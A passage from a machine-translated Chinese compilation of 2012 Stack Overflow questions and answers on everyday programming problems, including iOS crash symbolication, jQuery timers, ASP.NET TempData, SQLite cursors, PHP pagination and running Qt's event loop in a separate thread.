Executable name: /Users/andersprivat/Documents/Builds/Debug-iphoneos/TypO Lite.app/TypO Lite

UUID doesn't match dsym for executable /Users/andersprivat/Documents/Builds/Debug-iphoneos/TypO Lite.app/TypO Lite
Did not find executable for dsym
## Warning: Can't find any unstripped binary that matches version of /var/mobile/Applications/527E2243-2DFB-4934-A9D3-F5C7C13FCBC0/TypO Lite.app/TypO Lite 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T14:37:55.057

能否请您添加`-v`参数。对于它试图表示的每个库，这应该会给你一些错误。我怀疑 iOS 5.1.1 符号和应用程序特定符号都无法通过 Spotlight 找到。

您是否将设备升级到 5.1.1 并且 Xcode 是否提取了符号？检查`~/Library/Developer/Xcode/iOS DeviceSupport`。它应该包含一个名为`5.1.1 (9B206)`.

关于您的应用程序符号：这是来自调试版本吗？如果是这样，您之后是否执行了另一个构建？如果是这样，这就是它也不会象征应用程序特定项目的原因。符号化脚本需要应用程序二进制文件和与其完全对应的 dSYM。

有关详细信息，请参阅此答案：[在象征 iPad 崩溃日志后回溯仍然不可读](https://stackoverflow.com/questions/10761070/backtrace-still-not-readable-after-symbolicating-ipad-crash-log/10762192#10762192)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T07:56:50.160

我想答案就在你面前。日志的第一行指出：

```
Error: No developer directory found at /Developer. Run /usr/bin/xcode-select to update the developer directory path. 
```

您的 Xcode.app 位于 /Applications 中。以前（在 Xcode 通过 Mac App Store 交付之前），Xcode 曾经位于 /Developer。因此，如果您运行：

```
/usr/bin/xcode-select -print-path 
```

输出将是： /Developer 虽然它应该是 /Applications

所以解决方案是运行：

```
sudo /usr/bin/xcode-select -switch /Applications 
```

（它必须以 root 身份运行才能更改设置）。然后重启 Xcode 并在 Organizer 中点击登录。或者如果日志不在列表中，则导入日志。现在它应该正确地表示。

顺便说一句，谢谢你的冗长问题。它让我想到了这个解决方案，因为我现在遇到了同样的问题。并且因为我使用了 Xcode，所以我没有看到关于 Xcode-select 的错误信息。

我想知道是否有人在 /Developer 中安装了 Xcode 有同样的问题。

# c# - 使用 GroupBox 作为界面布局

> ID：10772749
> 
> 赞同：0
> 
> 时间：2012-05-27T08:46:22.690
> 
> 标签：c#, winforms, layout, groupbox

我对矩阵的操作很少，每个操作都取决于用户的选择。每个操作都有自己的界面。为了保存上次操作的数据，我使用 GroupBox 来保存界面的按钮。例如，如果我决定要添加 2 个矩阵并键入它们并得到结果，但随后我切换到分析矩阵（并使添加的 GroupBox 不可见），我不会丢失添加界面的数据，我可以返回添加并使 GroupBox 可见。

我的问题是是否有更好的方法来保存整个界面而不仅仅是使 GroupBox 可见/不可见。将数据保存在某个 .txt 文件中并重新重建整个界面会更好吗？基本上我问是否可以使用 GroupBox 保存包含来自用户的数据的 Gui 界面？希望我的问题很清楚。我正在使用 Windows 表单 在此先感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:17:46.247

Of course it is better if you keep all your controls with input data available at immediate request, without recreating every time the user interface, when your user switch from input to analyze or viceversa. This will give a snappy response time and a better usability.

From a conceptual point of view, I don't like to hide/show controls on the screen. In your scenario I will try do divide the UI interface in two parts, one with the input controls and another for the analyzing activities. ([SplitContainer](http://msdn.microsoft.com/en-us/library/system.windows.forms.splitcontainer.aspx) comes to mind) In this way the user will be able to see on which input data is working and allows you (perhaps) to dinamically change the analyzing results while changing the input data.

However, I don't know how complex are the input data and analyze parts. Sometimes, if you have a very cluttered form is better to separate the two functionality inside a tabcontrol or separate windows (or, as you have already done, with this groupbox hide/show functionality).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:07:09.497

您不需要“保存整个界面”。应保存当前正在处理的应用程序数据，然后从当前 UI 中保存足够的状态数据，以便能够重新创建其状态。这意味着您不会保存整个组合框，而是只需保存每个单选按钮的选定状态。尝试以与 UI 无关的合理方式保存状态数据，这样，如果您更改 UI，就不必完全重写状态保存功能。

# jquery - 鼠标按下不起作用

> ID：10772751
> 
> 赞同：1
> 
> 时间：2012-05-27T08:47:20.723
> 
> 标签：jquery

使用下面的代码，当我单击并按住`bid-up`按钮时，它只通过一次代码，我必须再次单击它才能工作。它应该做的是重复代码直到 mouseup 或 mouseleave。我做错了什么？

```
$('.bid-up').live('mousedown',function() {

    var button = $(this);
    timeoutId = setTimeout(function(){

        var number = button.parent('div').siblings('#bid-child-container-2').find('#bid-price').val();
        var newnumber = number.split('.');
        var on = button.attr('data-on');

        button.siblings('#bid-down').attr('data-on','1');

        if(newnumber[1]<9) {
            var first = newnumber[0];
            var second = parseInt(newnumber[1])+1;
        }

        if(newnumber[1]==9) {
            var first = parseInt(newnumber[0])+1;
            var second = 0;
        }

        var finalnumber = first+'.'+second;
        button.parent('div').siblings('#bid-child-container-2').find('#bid-price').val(finalnumber);

    }, 20);

}).bind('mouseup mouseleave', function() {
    clearTimeout(timeoutId);
}); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T08:52:19.267

解决方案：使用`setInterval`and`clearInterval`代替 timeout，因为 setTimeout 只执行一次闭包函数，或者`setTimeout`在你的闭包函数中。

`setTimeout`在函数本身中使用的示例：

```
$('.bid-up').live('mousedown',function() {

    var button = $(this);

    function asd(){

        var number = button.parent('div').siblings('#bid-child-container-2').find('#bid-price').val();
        var newnumber = number.split('.');
        var on = button.attr('data-on');

        button.siblings('#bid-down').attr('data-on','1');

        if(newnumber[1]<9) {
        var first = newnumber[0];
        var second = parseInt(newnumber[1])+1;
        }

        if(newnumber[1]==9) {
        var first = parseInt(newnumber[0])+1;
        var second = 0;
        }

        var finalnumber = first+'.'+second;
        button.parent('div').siblings('#bid-child-container-2').find('#bid-price').val(finalnumber);

        timeoutId = setTimeout(asd, 20);
    }

    timeoutId = setTimeout(asd, 20);

}).bind('mouseup mouseleave', function() {
    clearTimeout(timeoutId);
}); 
```

使用`setInterval`and[`data`](http://api.jquery.com/data/)存储间隔 id 的示例。

```
$('.bid-up').live('mousedown',function() {

    var button = $(this);

    button.data('interval', setInterval(function (){

        var number = button.parent('div').siblings('#bid-child-container-2').find('#bid-price').val();
        var newnumber = number.split('.');
        var on = button.attr('data-on');

        button.siblings('#bid-down').attr('data-on','1');

        if(newnumber[1]<9) {
        var first = newnumber[0];
        var second = parseInt(newnumber[1])+1;
        }

        if(newnumber[1]==9) {
        var first = parseInt(newnumber[0])+1;
        var second = 0;
        }

        var finalnumber = first+'.'+second;
        button.parent('div').siblings('#bid-child-container-2').find('#bid-price').val(finalnumber);
    }, 20));

}).bind('mouseup mouseleave', function() {
    clearInterval(button.data('interval'));
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T08:59:36.983

试试这个：http: [//jsfiddle.net/R85Xb/](http://jsfiddle.net/R85Xb/)

```
var timeoutId;
function x()
{
        $("#bids").append("x");
        timeoutId = setTimeout(x, 200);
}

$('.bid-up').live('mousedown', function() {

    var button = $(this);
    timeoutId = setTimeout(x, 200);

}).bind('mouseup mouseleave', function() {
    //alert('clear');
    clearTimeout(timeoutId);
});​

<div class="bid-up">here</div>
<div id="bids"></div>​ 
```

# animation - 设置 SVG 边界

> ID：10772753
> 
> 赞同：0
> 
> 时间：2012-05-27T08:48:28.180
> 
> 标签：animation, svg

我可以知道如何测量我的 SVG 尺寸的宽度和长度吗？从那里，我想限制和限制所有图像元素只能在 SVG 内移动。

我的 SVG 名称是“main”，如何设置弹跳区域，以便当图像到达一侧时它不会从该区域移出？

目前，如果我设置更多图像出现在 SVG 上，它会以某种方式移出 SVG。有没有办法检查它？

```
 <!-- ******************** Animation ******************** -->  

        $(window).load(function(){
        $(document).ready(function(e) {
        var num = 0;
        var interval;

        $('#add').click(function(e) {
        $('#box').append('<div class="predator" id="predator'+ num + '"><img src="Pictures/PondSpecies/anchovies.png"></div>');
        $('#predator'+num).css({
        left: randomRange(500,150),
        top: randomRange(400,150)
        });

        if (interval)
        clearInterval(interval);
        interval = setInterval (function () {
        for (var i=0; i<num; i++) {
            $('#predator'+i).animate ({
                    left: '+=' + randomRange(-6,7),
                    top: '+=' + randomRange(-6,7)
            }, 100);
            }
            }, 100);
            num++;
            });
            $('#remove').click(function(e) {
            num--;

            $('#predator' + num).remove();

            if (num == 0 && interval)
            clearInterval(interval);
            });
            });

            /* FUNCTIONS */
            function randomRange(min, max) {
            return Math.random() * (max-min) + min;
            }
            });  

        <!-- ******************** Animation ******************** --> 
```

编辑::

我试图进行这 3 次检查，但不知何故它不起作用，检查...

```
function outOfBounds(point, boundary) {
    return point.y > boundary.top
    || point.y < boundary.bottom + 200
    || point.x < boundary.getLeftBoundAt(point.y)+500
    || point.x > boundary.getRightBoundAt(point.y)+500;
}

function getLeftBoundAt(y) {
    return this.slope * y + this.base + 300;
}

function getTopBoundAt(x) {
    var segment = this.topSegmentAt(x);
    return segment.origin.y + segment.slope * (x - segment.origin.x);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:59:12.417

**首先**，你不应该有两个事件声明，而只保留一个，最安全的是 DOM 就绪事件，所以如下：

```
$(window).load(function(){
    $(document).ready(function(e) {
    }
} 
```

用这个

```
$(document).ready(function(e) {
} 
```

或者，如果你想要最短的版本，你可以简单地使用

```
$(function(e) {
} 
```

* * *

**其次**，你提到了 SVG 动画，但我只能在你的代码中看到的是简单的 CSS 动画......

供您参考，这也是一个 CSS 动画：[http ://themble.com/bones](http://themble.com/bones)

* * *

现在，关于你的界限，通常我们设置为当前网页的宽度和高度，但这总是让开发人员知道他想要从动画中得到什么，有时我们可能只是想要一个类似条带的大小.. .

假设你有：

```
<div id="svg"></div> 
```

您将绘图区域设置为：

```
 svg = Raphael("svg", 
              $("#svg").width(), 
              $("#svg").height()); 
```

请注意，我在这里使用 Raphael 只是为了演示，如果不使用[RaphaelJs](http://raphaeljs.com/) ，您可以使用自己的库。

# configuration - 如何让hadoop程序使用包含参数列表的配置文件？

> ID：10772768
> 
> 赞同：0
> 
> 时间：2012-05-27T08:53:38.253
> 
> 标签：configuration, hadoop, arguments

我写了一个hadoop程序，我知道我可以直接将参数传递给hadoop使用args []，我的意思是目前是这样的

```
ToolRunner.run(new Configuration(), new RunDear(), args); 
```

但是如果有很多参数，我可以制作一个像下面这样的配置文件并传递给hadoop吗？这个文件应该在哪里，在本地文件系统或 hdfs 中？

```
sample_size 200
input_genotype_file /data/genotypes.txt 
input_phenotype_file /data/phenotypes.txt
output_directory /outout 
mtry 200
ntree 3000
distance 0 (e.g. 0=euclidean, 1=mehalanobis
variable_important 0 (e.g. 0=information gain, 1=permutation)
etc…. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-28T07:00:01.417

您可以将文件放入分布式缓存中，然后将配置中的文件名传递给您的任务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-28T07:43:42.587

您可以使用 conf.addResource(new Path(/path/to/local/file))。这会将文件传递给每个任务。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T09:00:08.140

您可以创建一个包装类，它读取这些参数并将它们设置在 agrs 数组中，然后传递它。

# java - 为什么 Svnkit 在更新到特定版本时会忽略外部？

> ID：10772772
> 
> 赞同：0
> 
> 时间：2012-05-27T08:54:46.323
> 
> 标签：java, svn, svnkit

我正在尝试使用 Java 1.7 和 SVNkit 1.7.4v1 导出在线 SVN 存储库的特定版本。但问题是，如果特定版本不是 HEAD，SVNkit 会忽略外部。使用 HEAD-revison，导出工作正常，并且包括外部。

我用`UpdateClient.doExport()`as well as `UpdateClient.doCheckout()`，两者都有同样的问题。

我的示例代码：

```
setupSVNKit();
SVNClientManager cm = SVNClientManager.newInstance();
SVNURL url = SVNURL.parseURIEncoded("https://xxxxxxxx");
File dstPath = new File("d:/svntest");
SVNUpdateClient uc = cm.getUpdateClient();
uc.setIgnoreExternals(false);

/*
uc.doExport(url, dstPath,
SVNRevision.HEAD, SVNRevision.create(11768),
null, true, SVNDepth.INFINITY);
*/

uc.doCheckout(url, dstPath, SVNRevision.UNDEFINED,
    SVNRevision.create(11768), SVNDepth.INFINITY, true); 
```

有谁知道如何解决这个问题？因为我需要外部设备。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T10:00:48.683

请在[http://issues.tmatesoft.com/issues/SVNKIT](http://issues.tmatesoft.com/issues/SVNKIT)提出问题。我无法重现该问题，但如果根据修订版忽略外部因素，那绝对是一个错误。

# asp.net - 使用 TempData 同时

> ID：10772773
> 
> 赞同：10
> 
> 时间：2012-05-27T08:55:24.523
> 
> 标签：asp.net, asp.net-mvc, session, tempdata

我试图减少一个站点的会话。所以添加 `<sessionState mode="Off" />` 到我的 web.config 中。之后，如果我执行

```
 Session["test"] = "yes"; 
```

我收到错误“<em>对象引用未设置为对象的实例。” 这可以。

但是有了这个配置，我可以设置

```
TempData["test"] = "yes"; 
```

`TempData["test"];`在控制器中并在查看页面中打印。它运作良好。

根据[MSDN](http://msdn.microsoft.com/en-us/library/dd394711.aspx) “TempData 属性值存储在会话状态中”。

那么，如果我提到`<sessionState mode="Off" />`TempData 是如何工作的？ASP.NET 是否仍将 TempData 存储在会话或其他地方？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-05-27T09:15:49.910

仅当您在同一请求期间在视图上打印时，这才适用于禁用会话状态`TempData["test"]`- 因此此值已从 TempData 字典中删除，并且 MVC 不会尝试将其保存到会话状态。尝试将其从您的视图中删除，您将得到`System.InvalidOperationException: The SessionStateTempDataProvider class requires session state to be enabled.`

您可以通过添加属性或使用接口`[SessionState(SessionStateBehavior.Disabled)]`实现您自己的 TempData 提供程序来单独禁用控制器的会话状态。`ITempDataProvider`

[编辑] 只是为了解释我的第一点，让我们想象两种情况：

*   您有控制器操作，它分配一些值，`TempData["test"]`以及从该操作返回并打印此数据的相应视图。在这种情况下，即使没有会话状态，一切都会正常工作，因为不需要`TempData["test"]`在请求之间进行存储。
*   您有控制器操作，它分配一些值，`TempData["test"]`但将用户重定向到另一个操作，该操作具有自己的打印此数据的视图。在这种情况下，它不会在会话状态禁用的情况下工作，因为 MVC 需要`TempData["test"]`在两个请求之间存储您的值。

# sql - 选择SQL表中的最大重复记录数

> ID：10772775
> 
> 赞同：1
> 
> 时间：2012-05-27T08:55:59.007
> 
> 标签：sql, sql-server, database

如果我在 SQL 表中有多个记录，例如：

```
name                score
...................................
sami                55
ali                 140
sami                60 
```

我想为每个玩家选择最高分。预期的结果是：

```
ali ,140
sami, 60 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:57:34.863

看起来就这么简单：

```
SELECT name, MAX(score) FROM <table_name> GROUP BY name 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T09:04:09.983

```
Select name,max(score) as 'Highest Score' from gametable group by name; 
```

# android - 从 SQLite 数据库读取的问题

> ID：10772779
> 
> 赞同：0
> 
> 时间：2012-05-27T08:56:45.343
> 
> 标签：android, database, sqlite

我在使用“光标”读取 SQLite 数据库的数据方面没有太多知识，但是使用一些参考资料和示例我编译了一些来设置这个我不知道为什么它会从数据库中读取，我检查数据是否输入到数据库使用数据库浏览器和它的存在可以有人告诉我如何使这项工作吗？

我有一个单独的类来保存数据库连接和查询，因为我有一个函数来获取所有具有指定值的长值的字段

```
public Cursor getAppointments(long date) throws SQLException
    {
    Cursor mCursor =
    db.query(true, DATABASE_TABLE, new String[] {
    KEY_ROWID,
    APP_TIME,
    APP_TITLE,
    },
    APP_DATE + "="  + date,
    null,
    null,
    null,
    null,
    null);
    if (mCursor != null) {
    mCursor.moveToFirst();
        }
    return mCursor;
    } 
```

这段代码应该做的是获取所有具有相应日期的记录作为查询值并返回。

现在在主类中，我有这段代码可以逐行捕获并显示在 Textview 中。

```
 db.open();
       Display.setText("");
       Cursor c = db.getAppointments(SDate);

      if (c.moveToFirst())
          Display.setText(DisplayTitle(c));
       else
       Toast.makeText(this, "No title found",
       Toast.LENGTH_LONG).show();

       db.close(); 
```

并且显示标题方法是

```
private String DisplayTitle(Cursor c) {

        String Final ="";

        Final = c.getString(1)  + " " +c.getString(2) + " " +  c.getString(3)  + "\n" ;

        return Final;

    } 
```

有人可以告诉我为了检索与日期具有相同长值的记录并将其显示在文本视图中需要进行哪些更改，可以有多个具有相同长值的记录，因此必须使用日期的相同长值并将其显示在文本视图中。

干杯，寻找快速回复。:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-27T10:14:40.407

使用这种使用游标的简单方法：

```
 String q = "SELECT * FROM DATABASE_TABLE where(APP_DATE like '"+date+"')";//your query
 Cursor c = db.rawQuery(q, null); //  db is a object of SQLiteDatabase type 
```

如果您不确定列索引，则使用**getColumnIndex()**方法使用列名检索相应列的值，例如：

```
 if(c.getCount() == 0)
              {                   
                 //No entry found
              }
              else  {
                  c.moveToFirst();
                  do {
                      String mail = c.getString(c.getColumnIndex("KEY_ROWID"))+c.getString(c.getColumnIndex("APP_TIME"))+c.getString(c.getColumnIndex("APP_TITLE")); 
                        // do whatever you like with each record                    
                    } while (c.moveToNext());               
            c.close();
            db.close(); 
```

* * *

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:11:15.857

您已开始在 DisplayTitle 方法中从索引 1 开始读取光标。它应该是 0。分别表示 c.getString(0) 和。

# java - 无法运行石英调度程序

> ID：10772780
> 
> 赞同：1
> 
> 时间：2012-05-27T08:57:11.570
> 
> 标签：java, logging, log4j, quartz-scheduler

我正在关注这个例子，[http://www.quartz-scheduler.org/documentation/quartz-2.1.x/quick-start](http://www.quartz-scheduler.org/documentation/quartz-2.1.x/quick-start)

在示例的一部分中，它提到“如果您尚未设置日志记录，所有日志都将发送到控制台，您的输出将如下所示”

我尝试了这个例子，但我在控制台中看不到输出。

我唯一的消息是

```
log4j:WARN No appenders could be found for logger (org.quartz.impl.StdSchedulerFactory).
log4j:WARN Please initialize the log4j system properly. 
```

我错过了什么吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-27T11:10:15.623

看起来您正在使用[log4j](/questions/tagged/log4j "显示标记为“log4j”的问题")。您需要配置 Log4j，以便它知道如何处理来自[quartz-scheduler](/questions/tagged/quartz-scheduler "显示标记为“石英调度程序”的问题")的日志语句。一个[最小的`log4j.xml`配置文件](http://wiki.apache.org/logging-log4j/Log4jXmlFormat)是一个好的开始：

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE log4j:configuration SYSTEM "log4j.dtd">

<log4j:configuration xmlns:log4j="http://jakarta.apache.org/log4j/">
  <appender name="console" class="org.apache.log4j.ConsoleAppender"> 
    <param name="Target" value="System.out"/> 
    <layout class="org.apache.log4j.PatternLayout"> 
      <param name="ConversionPattern" value="%-5p %c{1} - %m%n"/> 
    </layout> 
  </appender> 

  <root> 
    <priority value ="debug" /> 
    <appender-ref ref="console" /> 
  </root>

</log4j:configuration> 
```

把它放在一个名为`log4j.xml`CLASSPATH 根目录的文件中。

# php - 排序后PHP-Pagination不起作用

> ID：10772783
> 
> 赞同：0
> 
> 时间：2012-05-27T08:59:00.510
> 
> 标签：php, mysql, html

嗨，我有一个工作正常**的基于 php 的**分页，但是当我通过排序链接对数据进行排序时，分页不起作用..

我使用的排序方法具有与 mysql 查询的直接链接排序。

请看看我做错了什么。

**到目前为止我的完整代码**

```
 <?php 
    $table='mytable';
    $pagename = "is-test.php";
$db = mysql_select_db($database,$connection) or trigger_error("SQL", E_USER_ERROR);
$sql1 = "SELECT COUNT(*) FROM $table";
$result1 = mysql_query($sql1, $connection) or trigger_error("SQL", E_USER_ERROR);
$row = mysql_fetch_row($result1);
$numrows = $row[0];
$rowsperpage = 5;
$totalpages = ceil($numrows / $rowsperpage);
if (isset($_GET['page']) && is_numeric($_GET['page'])) {
$currentpage = (int) mysql_real_escape_string($_GET['page']);
} else {
$currentpage = 1;
}
if ($currentpage > $totalpages) {
$currentpage = $totalpages;
}
if ($currentpage < 1) {
$currentpage = 1;
}
$orderBy = array('id', 'title',);
$order = '';
if (isset($_GET['orderBy']) && in_array($_GET['orderBy'], $orderBy)) {
$order = mysql_real_escape_string($_GET['orderBy']);
}else{
$order='id';
}
$offset = ($currentpage - 1) * $rowsperpage;
$sql2 = "SELECT * FROM $table ORDER BY $order ASC LIMIT $offset, $rowsperpage";
$result2 = mysql_query($sql2, $connection) or trigger_error("SQL", E_USER_ERROR);
$list = mysql_fetch_assoc($result2);
$startrow = ($currentpage-1) * $rowsperpage;

////////////////////////LINKS FOR SORTING///////////////////////
         echo "<a href=orderBy=id,>id:</a>";
         echo "<a href=orderBy=title,>title:</a>";
////////////////////////////////////////////////////////////////

//////////////////////////PAGINATION///////////////////////////
echo " <li><a href='$pagename?orderBy=$order,page=$totalpages'>$totalpages</a></li> ";

if ($currentpage != $totalpages) {
$nextpage = $currentpage + 1;
echo " <li><a href='$pagename?orderBy=$order,page=$nextpage'>Next&raquo;&raquo;</a></li> ";
}

if($currentpage<$totalpages){
for ($x = ($currentpage - 3); $x < (($currentpage + 3) + 1); $x++) {
if (($x > 0) && ($x <= $totalpages)) {
if ($x == $currentpage) {
echo " <li id='pcurrent'><a href='$pagename?orderBy=$order,page=$x'>$x</a></li>";
} else {
echo " <li><a href='$pagename?orderBy=$order,page=$x'>$x</a></li> ";
}}}  
}

if ($currentpage > 1){
$prevpage = $currentpage - 1;
echo " <li><a href='$pagename?page=$prevpage'>&laquo;&laquo;Prev</a></li> ";
} 
if ($currentpage > 5) {
echo "<li><a href='$pagename?page=1'>1</a></li> ";
}
    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T09:09:39.643

刚刚看到：您的 URL 调用中有逗号而不是 & ：

```
echo " <li><a href='$pagename?orderBy=$order,page=$nextpage'>Next&raquo;&raquo;</a></li> "; 
```

改成：

```
echo " <li><a href='$pagename?orderBy=$order&page=$nextpage'>Next&raquo;&raquo;</a></li> "; 
```

*   更改其他有此问题的行

# ios - 视频播放完毕后如何显示通知？

> ID：10772793
> 
> 赞同：0
> 
> 时间：2012-05-27T09:00:47.987
> 
> 标签：ios, mpmovieplayercontroller

我正在做一个播放视频的项目。我想显示一个通知，例如：“你喜欢视频吗？”。我怎么知道视频已经完成了？是否有任何委托方法等？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:13:26.123

来自苹果文档：

**MPMoviePlayerPlaybackDidFinishNotification**

电影播放完毕后发布。此通知的 userInfo 字典包含 MPMoviePlayerPlaybackDidFinishReasonUserInfoKey 键，它指示播放完成的原因。当播放因错误而失败时，也会发送此通知。状态已更改的电影播放器​​可用作与通知关联的对象。

当电影以全屏模式显示并且用户点击完成时，不会发送此通知。完成按钮暂停播放并导致电影播放器​​退出全屏模式。要检测这种情况，请注册其他通知，例如 MPMoviePlayerDidExitFullscreenNotification。

可用性 适用于 iOS 2.0 及更高版本。在 MPMoviePlayerController.h 中声明

# c++ - app.exec() 不能调用其他方法（静态库 Qt）

> ID：10772794
> 
> 赞同：0
> 
> 时间：2012-05-27T09:01:29.353
> 
> 标签：c++, qt

我创建了一个静态库 Qt。我需要通过调用一些方法来改变图片的位置。问题是“app.exec()”完全阻塞了进程。你知道怎么做吗？

非常感谢 ！

这是我的lib头文件

```
int init(int argc, char *argv[], int width, int height);
void changePos (int x, int y);
void destroyPic(); 
```

我的初始化是：QWidget* window(0); QLabel* pic(0);

```
int init(int argc, char *argv[], int width, int height) {
    // initialize resources, if needed
    Q_INIT_RESOURCE(target);

    QApplication app(argc, argv);
    window = new QWidget();
    window->setWindowTitle("Test");
    window->setFixedSize(width, height);
    // create and show your widgets here
    pic = new QLabel(window);

    QPixmap pixmap(QString(":/res/pic.png"));
    pic->setPixmap(pixmap);
    pic->move(100,100);
    pic->setVisible(true);
    window->show();
    app.exec();

    return 0;
} 
```

问题是我不能在我的主代码（使用这个库）中调用方法 changePos 或 destroy 因为 app.exec() 阻止了进程......怎么办？

非常感谢 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-01T08:42:59.207

您需要在单独的 QThread 中启动 QApplication。这显示在下面的代码中。我还没有让它在 OS X 上运行，但我相信它应该是可行的。我首先需要为 OS X 制作一个调试版本，然后我会看看发生了什么。它已经过测试可以在 Windows 上运行，并且可能也可以在 X11 上运行。Objective C 代码仅适用于 mac，它可能是必需的，但还不够。

它是一个完整的可运行应用程序，对于一个库，您可以删除`main()`函数并调用 init、changePos 并根据需要直接完成。

```
#applib.pro
QT       += core gui
TARGET = applib
TEMPLATE = app
!x11:!embedded:!qpa:mac {
    LIBS_PRIVATE += -framework Cocoa -lz
    OBJECTIVE_SOURCES += thread.mm
}
SOURCES += main.cpp 
```

```
//main.cpp
#include <cstdlib>
#include <QtCore/QThread>
#include <QtCore/QMutex>
#include <QtCore/QMutexLocker>
#include <QtCore/QWaitCondition>
#include <QtCore/QEvent>
#include <QtGui/QLabel>
#include <QtGui/QApplication>

//
// API
//

extern "C" {
    void init(int argc, char ** argv);
    void changePos(int x, int y);
    void finish();
}

// demonstration code, remove from the library
int main(int argc, char ** argv)
{
    class Helper : private QThread {
    public:
        static void msleep(unsigned long ms) {
            QThread::msleep(ms);
        }
    };

    init(argc, argv);
    Helper::msleep(2000);
    changePos(0, 0);
    Helper::msleep(2000);
    finish();
}

//
// IMPLEMENTATION
//

struct PosEvent : public QEvent
{
    PosEvent(int x_, int y_) : QEvent(t()),
        x(x_), y(y_) {}
    const int x, y;
    static QEvent::Type t() { return (QEvent::Type)(QEvent::User + 0); }
};

class Widget : public QLabel
{
public:
    Widget() : QLabel("Hello!") {}
protected:
    void customEvent(QEvent * ev) {
        if (ev->type() == PosEvent::t()) {
            PosEvent * pev = static_cast<PosEvent*>(ev);
            move(pev->x, pev->y);
        }
    }
};

class QCoreApplicationPrivate {
public:
    static QThread * theMainThread;
};

extern "C++" { Qt::HANDLE qt_application_thread_id; }

class AppThread : public QThread
{
public:
    AppThread(int& argc_, char ** argv_) {
        Q_ASSERT(!instance);
        instance = this;
        QMutexLocker lock(&argMutex);
        argc = &argc_;
        argv = argv_;
        start();
        wc.wait(&argMutex);
    }
    static void changePos(int x, int y) {
        QCoreApplication::postEvent(instance->widget, new PosEvent(x,y));
    }
    static void finish() {
        instance->app->exit();
        instance->wait();
        delete instance;
    }

protected:
    void run() {

        int i = 0;

#ifdef Q_OS_UNIX
        //qDebug("%p", qt_application_thread_id);
        QCoreApplicationPrivate::theMainThread = QThread::currentThread();
#endif
        QApplication a(i, 0);
        app = &a;
        wc.wakeAll();

        Widget w;
        widget = &w;
        w.show();

        rc = a.exec();
    }
private:
    static AppThread * instance;
    QCoreApplication * app;
    QObject * widget;
    QMutex argMutex;
    QWaitCondition wc;
    int* argc;
    char** argv;
    int rc;

};
AppThread * AppThread::instance = 0;

bool multiThreader();

#ifndef Q_OS_MAC
bool multiThreader() { return true; }
#endif

extern "C" void init(int argc, char ** argv) {
    multiThreader();
#ifdef Q_OS_MAC
    qDebug("DYLD_IMAGE_SUFFIX=%s", getenv("DYLD_IMAGE_SUFFIX"));
#endif
    new AppThread(argc, argv);
}

extern "C" void changePos(int x, int y) { AppThread::changePos(x, y); }

extern "C" void finish() { AppThread::finish(); } 
```

```
//thread.mm
#import <Foundation/Foundation.h>

@interface DeadThread : NSObject { ;; }
    + (void)enterMultiThreadedMode;
    + (void)emptyThreadMethod:(id)obj;
@end
@implementation DeadThread
    + (void)enterMultiThreadedMode {
        NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
        [NSThread detachNewThreadSelector:@selector(emptyThreadMethod:)
            toTarget:[DeadThread class] withObject:nil];
        [pool release];
    }
+ (void)emptyThreadMethod:(id)obj { (void)obj; }
@end

bool multiThreader()
{
    [DeadThread enterMultiThreadedMode];
    return [NSThread isMultiThreaded];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T11:11:31.893

您可以在使用 QApplication::exec() 进入 QApplication 事件循环之前调用 init()。

我能想到的唯一其他选择是：

1.  惰性初始化，当您的库的用户调用 changePos() 或 destroyPic() 时，如果尚未调用它，则调用 init()。

2.  使用单次计时器在事件循环之后执行：

就像是：

```
QTimer::singleShot(0, this, SLOT(init())); 
```

这将要求您有一个 QObject 并且 init 或其他调用 init 的函数很多。在 QApplication::exec() 之前调用它，插槽将在事件循环开始后执行。

# php - 我需要在 jquery 中停止 slideUp

> ID：10772796
> 
> 赞同：0
> 
> 时间：2012-05-27T09:01:41.380
> 
> 标签：php, jquery, mouseover, slidedown, slideup

我写了这段代码，它现在为我制作了一个幻灯片，当鼠标悬停时我需要停止向上滑动

```
$(document).ready(function () {
$('#ticker_02').mouseover(function() {
  //I NEED THIS CODE
    })

});

function tick2(){
    $('#ticker_02 li:first').slideUp( function () { $(this).appendTo($('#ticker_02')).slideDown(); });
}
setInterval(function(){ tick2 () }, 2000); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T09:07:10.790

尝试`stop()`方法：

```
$('#ticker_02').mouseover(function() {
  $(this).stop(true);
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-09-30T10:08:25.273

```
function tick2(){
  $('#ticker_02 li:first').slideUp(
    function () {
      $(this).appendTo($('#ticker_02')).slideDown();
    }
  );
}

d=setInterval(function(){ tick2 () }, 5000);

function stop1(){
  clearInterval(d);
}
function start1(){
  d=setInterval(function(){ tick2 () }, 5000);
}
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<ul id="ticker_02" class="ticker" onmouseover="stop1()" onmouseout="start1()" >
  <li>element1</li>
  <li>element2</li>
</ul>
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-30T10:11:44.837

